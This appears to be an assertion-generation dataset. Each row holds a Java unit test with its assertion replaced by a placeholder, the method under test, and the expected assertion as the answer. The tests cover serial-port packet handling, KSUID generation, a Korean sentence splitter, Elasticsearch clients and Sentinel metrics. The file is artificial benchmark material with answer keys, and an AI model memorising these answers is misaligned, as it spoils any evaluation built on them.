toInt() { if (value.length == 1) { return value[0] & 0xFF; } else if (value.length == 2) { return ByteFormatter.bytes2short(value); } else if (value.length == 4) { return ByteFormatter.bytes2int(value); } else { throw new ByteFormatException(""the length of values must be [one, two, four]""); } }"	assertEquals(0x01, new Payload(new byte[]{0x01}).toInt())
"toInt5() { ""<AssertPlaceHolder>""; }
toInt() { if (value.length == 1) { return value[0] & 0xFF; } else if (value.length == 2) { return ByteFormatter.bytes2short(value); } else if (value.length == 4) { return ByteFormatter.bytes2int(value); } else { throw new ByteFormatException(""the length of values must be [one, two, four]""); } }"	assertEquals(0x0102, new Payload(new byte[]{0x01, 0x02}).toInt())
"IOException { when(mManager.getSerialPorts()).thenReturn(new String[]{""1100""}); when(mManager.openSerialPort(anyString())).thenReturn(mPort);  final byte[] inputBytes = new byte[]{ 0x02, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00, 0x02, 0x01, 0x03, 0x01, 0x02, 0x00, 0x01, (byte) 0xcb, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x03, (byte) 0xd9 /*illegal lrc*/ };  when(mPort.read(any(ByteBuffer.class), anyInt())).thenAnswer((Answer<Integer>) invocation -> { final ByteBuffer buffer = invocation.getArgumentAt(0, ByteBuffer.class); buffer.put(inputBytes);  return inputBytes.length; });  final Packet packet = new Packet.Builder(0x0103).setRetryTimes(2).build();  new Job(mManager, new PackerImpl(null), packet, mCallback).run();  verify(mManager, times(3)).getSerialPorts(); verify(mManager, times(3)).openSerialPort(anyString()); verify(mManager,times(1)).acquireWakeLock(); verify(mManager,times(1)).releaseWakeLock();  verify(mPort, times(3)).read(any(ByteBuffer.class), anyInt()); verify(mPort, times(3)).write(any(ByteBuffer.class), anyInt()); verify(mPort, times(3)).close();  verify(mCallback, never()).onSuccess(any(Packet.class));  final ArgumentCaptor<Exception> argumentCaptor = ArgumentCaptor.forClass(Exception.class); verify(mCallback, times(1)).onFail(argumentCaptor.capture()); ""<AssertPlaceHolder>"";  verifyNoMoreInteractions(mManager, mPort, mCallback); }
run() { mManager.acquireWakeLock(); final int maxRetryTimes = mPacket.getRetryTimes();  for (int i = 0; i <= maxRetryTimes; ++i) { Packet result = null; Exception error = null;  try { result = portCommunicate(); } catch (Exception e) { error = e; }  if (result != null) { mCallback.onSuccess(result); mManager.releaseWakeLock(); return; } else if (i == maxRetryTimes) { mCallback.onFail(error); mManager.releaseWakeLock(); return; } }  mManager.releaseWakeLock(); throw new IllegalStateException(""this line should not be executed""); }"	assertTrue(argumentCaptor.getValue() instanceof IllegalArgumentException)
"IOException { final SparseArrayCompat<Payload> payloads = new SparseArrayCompat<>(); payloads.put(0x01, new Payload(new byte[]{0x02, 0x03}));  ""<AssertPlaceHolder>""; }
serializePayloads(@NonNull SparseArrayCompat<Payload> payloads) throws IOException { final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();  for (int i = 0, size = payloads.size(); i < size; ++i) { final int tag = payloads.keyAt(i); final Payload payload = payloads.valueAt(i);  if (payload == null) { continue; }  outputStream.write(serializeTLV(tag, payload.getValue())); }  return outputStream.toByteArray(); }"	assertArrayEquals(new byte[]{ 0x00, 0x01, 0x00, 0x02, 0x02, 0x03 }, new PackerImpl(null).serializePayloads(payloads))
"IOException { final SparseArrayCompat<Payload> payloads = new SparseArrayCompat<>(); payloads.put(0x01, new Payload(new byte[]{0x02, 0x03})); payloads.put(0x02, null);  ""<AssertPlaceHolder>""; }
serializePayloads(@NonNull SparseArrayCompat<Payload> payloads) throws IOException { final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();  for (int i = 0, size = payloads.size(); i < size; ++i) { final int tag = payloads.keyAt(i); final Payload payload = payloads.valueAt(i);  if (payload == null) { continue; }  outputStream.write(serializeTLV(tag, payload.getValue())); }  return outputStream.toByteArray(); }"	assertArrayEquals(new byte[]{ 0x00, 0x01, 0x00, 0x02, 0x02, 0x03 }, new PackerImpl(null).serializePayloads(payloads))
"serializeTLV() { ""<AssertPlaceHolder>""; }
serializeTLV(int tag, @NonNull byte[] value) { final byte[] bytes = new byte[2 + 2 + value.length]; System.arraycopy(ByteFormatter.short2bytes(tag), 0, bytes, 0, 2); System.arraycopy(ByteFormatter.short2bytes(value.length), 0, bytes, 2, 2); System.arraycopy(value, 0, bytes, 4, value.length);  return bytes; }"	assertArrayEquals(new byte[]{ 0x00, 0x00, 0x00, 0x01, 0x00 }, new PackerImpl(null).serializeTLV(0x00, new byte[]{0x00}))
"serializeTLV2() { ""<AssertPlaceHolder>""; }
serializeTLV(int tag, @NonNull byte[] value) { final byte[] bytes = new byte[2 + 2 + value.length]; System.arraycopy(ByteFormatter.short2bytes(tag), 0, bytes, 0, 2); System.arraycopy(ByteFormatter.short2bytes(value.length), 0, bytes, 2, 2); System.arraycopy(value, 0, bytes, 4, value.length);  return bytes; }"	assertArrayEquals(new byte[]{ 0x00, 0x00, 0x00, 0x00 }, new PackerImpl(null).serializeTLV(0x00, new byte[0]))
"Exception { final byte[] bytes = new byte[]{ 0x02, 0x00, 0x00, 0x0c, 0x00, 0x01, 0x00, 0x02, 0x06, 0x01, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x03, 0x09 };  when(mPort.read(any(ByteBuffer.class), anyInt())).thenAnswer((Answer<Integer>) invocation -> { final ByteBuffer buffer = invocation.getArgumentAt(0, ByteBuffer.class); buffer.put(bytes);  return bytes.length; });  final Callable<byte[]> callable = new SerialReader(mPort); final byte[] result = callable.call();  ""<AssertPlaceHolder>""; verify(mPort, times(1)).read(any(ByteBuffer.class), anyInt()); }
call() throws Exception { final ByteBuffer buffer = ByteBuffer.allocateDirect(CONSTANTS.MAX_BUFFER_SIZE);  boolean looping = true; int position = 0; int limit = 0; int target = 1; // sizeOf(stx) int milestone = 0; int read;  while (looping) { read = mPort.read(buffer, limit); if (read != 0) { byte[] data = new byte[read]; int pos = buffer.position(); buffer.get(data); buffer.position(pos); if (buffer.get(0) != STX) { Log.w(TAG, ""receive: "" + ByteFormatter.bytes2utf8(data)); buffer.position(0); continue; } }  limit += read; while (limit - position >= target) { final int newTarget = checkMilestone(buffer, milestone, position);  if (newTarget == 0) { looping = false; position += 1; break; } ++milestone; position += target; target = newTarget; } }  buffer.position(position); buffer.flip(); final byte[] bytes = new byte[position]; buffer.get(bytes);  return bytes; }"	assertArrayEquals(bytes, result)
"testGetDslTemplateKeys() { dslTemplateService.putDSLTemplate(""key"", dslTemplate); List<String> dslTemplateKeys = dslTemplateService.getDslTemplateKeys(); ""<AssertPlaceHolder>""; }
getDslTemplateKeys();"	assertEquals(true, dslTemplateKeys.size() >= 0)
"testGetNewDslTemplateKeys() { dslTemplateService.putNewDSLTemplate(""key1"",dslTemplate); List<String> newDslTemplateKeys = dslTemplateService.getNewDslTemplateKeys(); ""<AssertPlaceHolder>""; }
getNewDslTemplateKeys();"	assertEquals(true, newDslTemplateKeys.size() >= 0)
"testGetDetailLogFlag() { Map<String, ESCluster> stringESClusterMap = esClusterService.listESCluster(); ""<AssertPlaceHolder>""; }
listESCluster();"	assertEquals(true, stringESClusterMap != null)
"testGetClient3() { queryContext.setClusterId(null); esClient = esClusterService.getClient(queryContext, indexTemplate, ""action""); ""<AssertPlaceHolder>""; }
getClient(QueryContext queryContext, IndexTemplate indexTemplate, String actionName);"	assertEquals(true, esClient != null)
"testGetClient4() { queryContext.setClusterId(null); indexTemplate.setSlaveInfos(null); esClient = esClusterService.getClient(queryContext, indexTemplate, ""action""); ""<AssertPlaceHolder>""; }
getClient(QueryContext queryContext, IndexTemplate indexTemplate, String actionName);"	assertEquals(true, esClient != null)
"testGetClientFromCluster() { esClient = esClusterService.getClientFromCluster(queryContext, CustomDataSource.CLUSTER_NAME, ""action""); ""<AssertPlaceHolder>""; }
getClientFromCluster(QueryContext queryContext, String clusterName, String actionName);"	assertEquals(true, esClient != null)
"testGetWriteClient() { esClient = esClusterService.getWriteClient(indexTemplate, ""action""); ""<AssertPlaceHolder>""; }
getWriteClient(IndexTemplate indexTemplate, String actionName);"	assertEquals(true, esClient != null)
"testSplit() { String text = ""회사 동료 분들과 다녀왔는데 분위기도 좋고 음식도 맛있었어요 다만, 강남 토끼정이 강남 쉑쉑버거 골목길로 쭉 올라가야 하는데 다들 쉑쉑버거의 유혹에 넘어갈 뻔 했답니다 강남역 맛집 토끼정의 외부 모습.""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(3)
"testSingleQuotes() { String text = ""여당이 내놓은 상가건물 임대차보호법 개정안, 이른바 ‘임대료 멈춤법’에 대한 논의가 급물살을 타면서 자영업자들과 임대인의 의견이 팽팽하게 맞서고 있다. 신종 코로나바이러스 감염증(코로나19) 확진자 급증세로 집합 제한·집합 금지 기간이 길어지면서 한계에 직면한 소상공인과 자영업자들 사이에서는 임대료 부담을 호소하며 ""법안을 조속히 시행해 달라""는 목소리가 터져나오고 있다. 반면 임대인들은 임대료 인하를 강제화하는 것은 부당하다며 정부와 여당이 ‘나쁜 임대인(건물주)’ 프레임을 만들고 있다고 비판했다. 업계 전문가들 사이에서도 우려의 목소리가 여럿 있다. 재산권 침해 소지가 있고, 월세 수익이 끊기면 생활이 곤란해지는 ‘생계형 임대인’들이 피해를 볼 수 있는 등 또 다른 부작용이 발생할 수 있다는 것이다. 법 개정 자체만으로 상가 거래 시장이 위축될 가능성도 지적됐다.""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(6)
"testRealignment() { String text = ""회사 동료 분들과 다녀왔는데 분위기도 좋고 음식도 맛있었어요 다만, 강남 토끼정이 강남 쉑쉑버거 골목길로 쭉 올라가야 하는데 다들 쉑쉑버거의 유혹에 넘어갈 뻔 했답니다 강남역 맛집 토끼정의 외부 모습.""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(3)
"testPrime() { String text = ""TV산업은 1926년 흑백 TV 개발, 1954년 RCA사가 Color TV(21"") 양산/판매를 시작한 이래로 트리니트론 브라운관(1967년), 완전평면 브라운관(1996년) 개발 등 기술적인 발전을 거듭해 왔으나, 주요 국가 보급률이 90%를 넘어서면서 브라운관 TV사업의 성장은 정체되었습니다. 그러나 Flat Panel TV(LCD, PDP) 출시, 디지털 방송 확산(영/미 1998년~ )을 통해 TV 시장은 성장 모멘텀을 되찾았으며, FPTV는 화질, 디자인 등 제품 성능 향상과 지속적인 Set가격 하락을 통해 성장을 지속하며 기존 CRT 시장을 빠르게 대체하였습니다. 또한 2010년 입체감을 느낄 수 있는 3D TV가 출시되었고, 2011년부터 2012년에 걸쳐 인터넷 동영상 서비스 업체들의 부상과 스마트기기에 대한 사용자들의 관심 확대로 스마트 TV 시장이 태동하였습니다. 2013년에는 화질 및 해상도가 혁신적으로 높아진 UHD TV, 2014년에는 새로운 Form Factor인 Curved TV가 출시되었으며 2015년에는 퀀텀닷TV가 상용화되는 등 TV 시장은 끊임없이 진화하였습니다.전체 TV 수요는 2017년 기준 2억 1,510만대 수준으로 LCD TV 수요가 2억 1천만대로 99% 이상의 시장 점유를 이어 나갔으며, OLED 수요는 159만대로 성장하였으나 비중은 0.7%로 영향이 미미하였습니다. 2018년도 전체 TV 수요는 2억 2,100만대 이상을 기록하며 전년 대비 2.9% 성장하였습니다. 최근 TV시장은 고해상도 대형화면에 대한 Needs가 지속적으로 증가하여, UHD TV는 전년비 26% 증가한 99.6백만대로 시장 비중 45% 수준이 될 전망이며, 60""이상 대형시장은 약 19.7백만대를 초과하여 전년비 35% 성장, 75""이상 초대형 시장도 당사의 판매 드라이브로 전년비 76% 이상 성장이 전망되고 있습니다.""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(7)
"testApostrophe() { String text = ""회사 동료 분들과 다녀왔는데 분위기도 좋고 음식도 맛있었어요 다만, 강남 토끼정이 강남 쉑쉑버거 골목길로 쭉 올라가야 하는데 다들 쉑쉑버거의 유혹에 넘어갈 뻔 했답니다 강남역 맛집 토끼정의 외부 모습.""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(3)
"testJyo() { String text = ""아무래도 그땐 그랬었죠 많이 힘들었으니까요 근데 이제는 괜찮아요 친구들이 많아졌어요 그때만 힘들었던거죠 이젠 괜찮아요""; List<String> splitted = kss.splitSentences(text); Assertions.""<AssertPlaceHolder>""; }
splitSentences( String text ) { return this.kss.splitSentences( text, true, true, 5, 20000, 0, true ); }"	assertThat(splitted.size()).isEqualTo(6)
"testGetMonotonicKsuidAfterLeapSecond() {  long second = Instant.parse(""2021-12-31T23:59:59.000Z"").getEpochSecond(); long leapSecond = second - 1; // simulate a leap second long times[] = { second, leapSecond };  AtomicInteger i = new AtomicInteger(); Supplier<Instant> instantFunction = () -> Instant.ofEpochSecond(times[i.getAndIncrement() % times.length]);  KsuidFactory factory = KsuidFactory.newMonotonicInstance(() -> new Random().nextLong(), instantFunction);  long ms1 = factory.create().getTime(); // second long ms2 = factory.create().getTime(); // leap second  ""<AssertPlaceHolder>""; // LEAP SECOND! DON'T MOVE BACKWARDS! }
create() { return create(instantFunction.get()); }"	assertEquals(ms1, ms2)
"testWithRandomNull() { KsuidFactory factory = KsuidFactory.newInstance((Random) null); ""<AssertPlaceHolder>""; }
create() { return create(instantFunction.get()); }"	assertNotNull(factory.create())
"testConstructorBytes() { Random random = new Random(); byte[] bytes = new byte[Ksuid.KSUID_BYTES];  for (int i = 0; i < DEFAULT_LOOP_MAX; i++) { random.nextBytes(bytes); Ksuid ksuid = new Ksuid(bytes); ""<AssertPlaceHolder>""; } }
toBytes() {  byte[] bytes = new byte[KSUID_BYTES];  // copy the seconds bytes[0] = (byte) ((this.seconds >>> 0x18) & 0xff); bytes[1] = (byte) ((this.seconds >>> 0x10) & 0xff); bytes[2] = (byte) ((this.seconds >>> 0x08) & 0xff); bytes[3] = (byte) ((this.seconds >>> 0x00) & 0xff);  // copy the payload System.arraycopy(this.payload, 0, bytes, TIME_BYTES, PAYLOAD_BYTES);  return bytes; }"	assertEquals(Arrays.toString(bytes), Arrays.toString(ksuid.toBytes()))
"testConstructorInts() { Random random = new Random(); int[] ints = new int[Ksuid.KSUID_INTS];  for (int i = 0; i < DEFAULT_LOOP_MAX; i++) { ints[0] = random.nextInt(); ints[1] = random.nextInt(); ints[2] = random.nextInt(); ints[3] = random.nextInt(); ints[4] = random.nextInt(); Ksuid ksuid = new Ksuid(ints); ""<AssertPlaceHolder>""; } }
toInts() { int[] ints = new int[KSUID_INTS];  // copy the seconds ints[0] = this.seconds;  // copy the payload for (int i = 1, j = 0; i < ints.length; i++, j += 4) { ints[i] |= (this.payload[j + 0] & 0xff) << 0x18; ints[i] |= (this.payload[j + 1] & 0xff) << 0x10; ints[i] |= (this.payload[j + 2] & 0xff) << 0x08; ints[i] |= (this.payload[j + 3] & 0xff) << 0x00; }  return ints; }"	assertEquals(Arrays.toString(ints), Arrays.toString(ksuid.toInts()))
"testConstructorTimeAndRandom() {  Random random = new Random();  for (int i = 0; i < DEFAULT_LOOP_MAX; i++) {  // get a random time and a random payload long time = random.nextLong() & 0x00000000ffffffffL; byte[] payload = new byte[Ksuid.PAYLOAD_BYTES]; random.nextBytes(payload);  // build the expected byte array byte[] expectedBytes = new byte[Ksuid.KSUID_BYTES]; ByteBuffer buffer = ByteBuffer.allocate(Ksuid.KSUID_BYTES + 4); buffer.putLong(time - Ksuid.EPOCH_OFFSET); // apply offset buffer.put(payload); System.arraycopy(buffer.array(), 4, expectedBytes, 0, Ksuid.KSUID_BYTES);  // get the actual byte array Ksuid ksuid = new Ksuid(time, payload); byte[] actualBytes = ksuid.toBytes();  // compare the actual byte array to the expected byte array for (int j = 0; j < Ksuid.KSUID_BYTES; j++) { ""<AssertPlaceHolder>""; } }  try { long time = 0x0000000000000000L; byte[] payload = null; new Ksuid(time, payload); fail(""Should throw an exception""); } catch (IllegalArgumentException e) { // success }  try { long time = 0x0000000000000000L; byte[] payload = new byte[Ksuid.PAYLOAD_BYTES + 1]; new Ksuid(time, payload); fail(""Should throw an exception""); } catch (IllegalArgumentException e) { // success } }
toBytes() {  byte[] bytes = new byte[KSUID_BYTES];  // copy the seconds bytes[0] = (byte) ((this.seconds >>> 0x18) & 0xff); bytes[1] = (byte) ((this.seconds >>> 0x10) & 0xff); bytes[2] = (byte) ((this.seconds >>> 0x08) & 0xff); bytes[3] = (byte) ((this.seconds >>> 0x00) & 0xff);  // copy the payload System.arraycopy(this.payload, 0, bytes, TIME_BYTES, PAYLOAD_BYTES);  return bytes; }"	assertEquals(expectedBytes[j], actualBytes[j])
"testToString() { Random random = new Random(); for (int i = 0; i < DEFAULT_LOOP_MAX; i++) { byte[] bytes = new byte[Ksuid.KSUID_BYTES]; random.nextBytes(bytes); Ksuid ksuid = Ksuid.from(bytes); ""<AssertPlaceHolder>""; } }
toString() { return toBase62(this); }"	assertEquals(toBase62(bytes), ksuid.toString())
"testFromString() { for (int i = 0; i < DEFAULT_LOOP_MAX; i++) { String string = getRandomString(); Ksuid ksuid = Ksuid.from(string); ""<AssertPlaceHolder>""; } }
toBytes() {  byte[] bytes = new byte[KSUID_BYTES];  // copy the seconds bytes[0] = (byte) ((this.seconds >>> 0x18) & 0xff); bytes[1] = (byte) ((this.seconds >>> 0x10) & 0xff); bytes[2] = (byte) ((this.seconds >>> 0x08) & 0xff); bytes[3] = (byte) ((this.seconds >>> 0x00) & 0xff);  // copy the payload System.arraycopy(this.payload, 0, bytes, TIME_BYTES, PAYLOAD_BYTES);  return bytes; }"	assertEquals(Arrays.toString(fromBase62(string)), Arrays.toString(ksuid.toBytes()))
"testToAndFromString() { for (int i = 0; i < DEFAULT_LOOP_MAX; i++) { String string = getRandomString(); Ksuid ksuid2 = Ksuid.from(string); ""<AssertPlaceHolder>""; } }
toString() { return toBase62(this); }"	assertEquals(string, ksuid2.toString())
"indexOf() { range(0, BASE_62_CHARACTERS.length) .forEach(index -> { final char charAtIndex = BASE_62_CHARACTERS[index]; ""<AssertPlaceHolder>""; }); }
indexOf(final char c) { if (c >= '0' && c <= '9') { return (c - 48); } if (c >= 'A' && c <= 'Z') { return (c - 55); } if (c >= 'a' && c <= 'z') { return (c - 61); } throw new IllegalArgumentException(""'"" + c + ""' is not a valid Base62 character""); }"	assertThat(Base62.indexOf(charAtIndex)).isEqualTo(index)
"hexDecode() { ""<AssertPlaceHolder>""; }
hexDecode(final String hex) { return hex != null ? parseHexBinary(hex) : null; }"	assertThat(Hex.hexDecode(HEX)).isEqualTo(PLAIN_TEXT.getBytes())
"hexDecodeCaseInsensitive() { ""<AssertPlaceHolder>""; }
hexDecode(final String hex) { return hex != null ? parseHexBinary(hex) : null; }"	assertThat(Hex.hexDecode(HEX.toLowerCase())).isEqualTo(PLAIN_TEXT.getBytes())
"hexDecodeNull() { ""<AssertPlaceHolder>""; }
hexDecode(final String hex) { return hex != null ? parseHexBinary(hex) : null; }"	assertThat(Hex.hexDecode(null)).isNull()
"hexEncode() { ""<AssertPlaceHolder>""; }
hexEncode(final byte[] bytes) { return bytes != null ? printHexBinary(bytes) : null; }"	assertThat(Hex.hexEncode(PLAIN_TEXT.getBytes())).isEqualTo(HEX)
"hexEncodeNull() { ""<AssertPlaceHolder>""; }
hexEncode(final byte[] bytes) { return bytes != null ? printHexBinary(bytes) : null; }"	assertThat(Hex.hexEncode(null)).isNull()
"testGenerate() { ""<AssertPlaceHolder>""; }
generate() { return createKsuid().toString(); }"	"assertThat(KsuidGenerator.generate()).matches(""[0-9a-zA-Z]{27}"")"
"fromInstantNewTimestamp() { final Instant instant = Instant.now(); final Ksuid ksuid = Ksuid.fromInstant(instant); final Instant instantCopy = ksuid.getInstant(); ""<AssertPlaceHolder>""; }
getInstant() { return Instant.ofEpochSecond((long) timestamp + EPOCH); }"	assertThat(instant.truncatedTo(ChronoUnit.SECONDS)).isEqualTo(instantCopy)
"testNewKsuid() { ""<AssertPlaceHolder>""; }
newKsuid() { return KsuidGenerator.createKsuid(); }"	assertThat(Ksuid.newKsuid()).isNotNull()
"comparable() { final Clock utc = Clock.systemUTC();  final KsuidGenerator generator = new KsuidGenerator(new SecureRandom()); final Ksuid first = generator.newKsuid(Instant.now(Clock.offset(utc, Duration.ofSeconds(2)))); final Ksuid second = generator.newKsuid(Instant.now(Clock.offset(utc, Duration.ofSeconds(4)))); final Ksuid third = generator.newKsuid(Instant.now(Clock.offset(utc, Duration.ofSeconds(6)))); final Ksuid fourth = generator.newKsuid(Instant.now(Clock.offset(utc, Duration.ofSeconds(8))));  final List<Ksuid> orderedList = Arrays.asList(first, second, third, fourth); final List<Ksuid> list = Arrays.asList(first, second, third, fourth); while (list.equals(orderedList)) { Collections.shuffle(list); } Collections.sort(list); ""<AssertPlaceHolder>""; }
equals(final Object o) { if (this == o) { return true; } if (!(o instanceof Ksuid)) { return false; }  final Ksuid that = (Ksuid) o;  return Objects.equals(this.timestamp, that.timestamp) && Arrays.equals(this.payload, that.payload) && Arrays.equals(this.ksuidBytes, that.ksuidBytes); }"	assertThat(list).isEqualTo(orderedList)
"testSerialization() { final Ksuid ksuid = Ksuid.newKsuid(); final Ksuid copy = SerializationUtils.roundtrip(ksuid); ""<AssertPlaceHolder>""; }
newKsuid() { return KsuidGenerator.createKsuid(); }"	assertThat(copy).isEqualTo(ksuid)
"multiplyByTwo() { Class1 class1 = new Class1(); int result = class1.multiplyByTwo(2); Assert.""<AssertPlaceHolder>""; }
multiplyByTwo(int i){ return i * 2; }"	assertEquals(4, result)
"multiplyByTwo2() { Class2 class2Mock = Mockito.mock(Class2.class); Mockito.when(class2Mock.getValue()).thenReturn(5);  Class1 class1 = new Class1(); int result = class1.multiplyByTwo2(class2Mock); Assert.""<AssertPlaceHolder>""; }
multiplyByTwo2(Class2 class2){ if(class2 == null){ logger.error(""The parameter should not be null""); System.exit(1); } return class2.getValue() * 2; }"	assertEquals(10, result)
"testSort() { String[] input = {""i"", ""have"", ""an"", ""egg""}; String[] expected = {""an"", ""egg"", ""have"", ""i""};  Sort.sort(input);  ""<AssertPlaceHolder>""; }
sort(String[] x) { sort(x, 0); }"	assertArrayEquals(expected, input)
"testSwap() { String[] input = {""i"", ""have"", ""an"", ""egg""}; int a = 0; int b = 2; String[] expected = {""an"", ""have"", ""i"", ""egg""};  Sort.swap(input, a, b); ""<AssertPlaceHolder>""; }
swap(String[] x, int a, int b) { String temp = x[a]; x[a] = x[b]; x[b] = temp; }"	assertArrayEquals(expected, input)
"testSave() { MetricEntity entry = new MetricEntity(); entry.setApp(""testSave""); entry.setResource(""testResource""); entry.setTimestamp(new Date(System.currentTimeMillis())); entry.setPassQps(1L); entry.setExceptionQps(1L); entry.setBlockQps(0L); entry.setSuccessQps(1L); inMemoryMetricsRepository.save(entry); List<String> resources = inMemoryMetricsRepository.listResourcesOfApp(""testSave""); Assert.""<AssertPlaceHolder>""; }
listResourcesOfApp(String app) { List<String> results = new ArrayList<>(); if (StringUtil.isBlank(app)) { return results; } // resource -> timestamp -> metric Map<String, LinkedHashMap<Long, MetricEntity>> resourceMap = allMetrics.get(app); if (resourceMap == null) { return results; } final long minTimeMs = System.currentTimeMillis() - 1000 * 60; Map<String, MetricEntity> resourceCount = new ConcurrentHashMap<>(32);  readWriteLock.readLock().lock(); try { for (Entry<String, LinkedHashMap<Long, MetricEntity>> resourceMetrics : resourceMap.entrySet()) { for (Entry<Long, MetricEntity> metrics : resourceMetrics.getValue().entrySet()) { if (metrics.getKey() < minTimeMs) { continue; } MetricEntity newEntity = metrics.getValue(); if (resourceCount.containsKey(resourceMetrics.getKey())) { MetricEntity oldEntity = resourceCount.get(resourceMetrics.getKey()); oldEntity.addPassQps(newEntity.getPassQps()); oldEntity.addRtAndSuccessQps(newEntity.getRt(), newEntity.getSuccessQps()); oldEntity.addBlockQps(newEntity.getBlockQps()); oldEntity.addExceptionQps(newEntity.getExceptionQps()); oldEntity.addCount(1); } else { resourceCount.put(resourceMetrics.getKey(), MetricEntity.copyOf(newEntity)); } } } // Order by last minute b_qps DESC. return resourceCount.entrySet() .stream() .sorted((o1, o2) -> { MetricEntity e1 = o1.getValue(); MetricEntity e2 = o2.getValue(); int t = e2.getBlockQps().compareTo(e1.getBlockQps()); if (t != 0) { return t; } return e2.getPassQps().compareTo(e1.getPassQps()); }) .map(Entry::getKey) .collect(Collectors.toList()); } finally { readWriteLock.readLock().unlock(); } }"	"assertTrue(resources.size() == 1 && ""testResource"".equals(resources.get(0)))"
"testSaveAll() { List<MetricEntity> entities = new ArrayList<>(10000); for (int i = 0; i < 10000; i++) { MetricEntity entry = new MetricEntity(); entry.setApp(""testSaveAll""); entry.setResource(""testResource"" + i); entry.setTimestamp(new Date(System.currentTimeMillis())); entry.setPassQps(1L); entry.setExceptionQps(1L); entry.setBlockQps(0L); entry.setSuccessQps(1L); entities.add(entry); } inMemoryMetricsRepository.saveAll(entities); List<String> result = inMemoryMetricsRepository.listResourcesOfApp(""testSaveAll""); Assert.""<AssertPlaceHolder>""; }
listResourcesOfApp(String app) { List<String> results = new ArrayList<>(); if (StringUtil.isBlank(app)) { return results; } // resource -> timestamp -> metric Map<String, LinkedHashMap<Long, MetricEntity>> resourceMap = allMetrics.get(app); if (resourceMap == null) { return results; } final long minTimeMs = System.currentTimeMillis() - 1000 * 60; Map<String, MetricEntity> resourceCount = new ConcurrentHashMap<>(32);  readWriteLock.readLock().lock(); try { for (Entry<String, LinkedHashMap<Long, MetricEntity>> resourceMetrics : resourceMap.entrySet()) { for (Entry<Long, MetricEntity> metrics : resourceMetrics.getValue().entrySet()) { if (metrics.getKey() < minTimeMs) { continue; } MetricEntity newEntity = metrics.getValue(); if (resourceCount.containsKey(resourceMetrics.getKey())) { MetricEntity oldEntity = resourceCount.get(resourceMetrics.getKey()); oldEntity.addPassQps(newEntity.getPassQps()); oldEntity.addRtAndSuccessQps(newEntity.getRt(), newEntity.getSuccessQps()); oldEntity.addBlockQps(newEntity.getBlockQps()); oldEntity.addExceptionQps(newEntity.getExceptionQps()); oldEntity.addCount(1); } else { resourceCount.put(resourceMetrics.getKey(), MetricEntity.copyOf(newEntity)); } } } // Order by last minute b_qps DESC. return resourceCount.entrySet() .stream() .sorted((o1, o2) -> { MetricEntity e1 = o1.getValue(); MetricEntity e2 = o2.getValue(); int t = e2.getBlockQps().compareTo(e1.getBlockQps()); if (t != 0) { return t; } return e2.getPassQps().compareTo(e1.getPassQps()); }) .map(Entry::getKey) .collect(Collectors.toList()); } finally { readWriteLock.readLock().unlock(); } }"	assertTrue(result.size() == entities.size())
"testDisabledLanguageServerMappingsPreference() { List<ContentTypeToLanguageServerDefinition> disabledDefinitions = LanguageServersRegistry.getInstance() .getContentTypeToLSPExtensions().stream().filter(lsDefinition -> !lsDefinition.isEnabled(null)) .toList(); ""<AssertPlaceHolder>""; }
isEnabled(@Nullable URI uri) { return isUserEnabled() && isExtensionEnabled(uri); }"	assertTrue(disabledDefinitions.contains(TestUtils.getDisabledLS()))
"testHyperlinkLabelNoLocation() { Location location = new Location(); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	assertEquals(locationType, hyperlink.getHyperlinkText())
"URISyntaxException { Location location = new Location(); location.setUri(""file:///Users/someuser/testfile""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - testfile - "" + Path.of(new URI(location.getUri())), hyperlink.getHyperlinkText())"
"URISyntaxException { LocationLink location = new LocationLink(); location.setTargetUri(""file:///Users/someuser/testfile""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - testfile - "" + Path.of(new URI(location.getTargetUri())), hyperlink.getHyperlinkText())"
"testHyperlinkLabelForIntroBasedLocationWithoutLabel() { Location location = new Location(); location.setUri(""http://org.eclipse.ui.intro/execute?command=mycommand%28bindingKey%3DLorg%2Ftest%2Fmvctest%2FMyComponent%3B%2CprojectName%3Dmvctest%29""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration"", hyperlink.getHyperlinkText())"
"testHyperlinkLabelForIntroBasedLocationLinkWithLabel() { LocationLink location = new LocationLink(); location.setTargetUri(""http://org.eclipse.ui.intro/execute?command=org.springframework.tooling.ls.eclipse.commons.commands.OpenJavaElementInEditor%28bindingKey%3DLorg%2Ftest%2Fmvctest%2FMyComponent%3B%2CprojectName%3Dmvctest%29&label=MyComponent+-+org.test.mvctest""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - MyComponent - org.test.mvctest"", hyperlink.getHyperlinkText())"
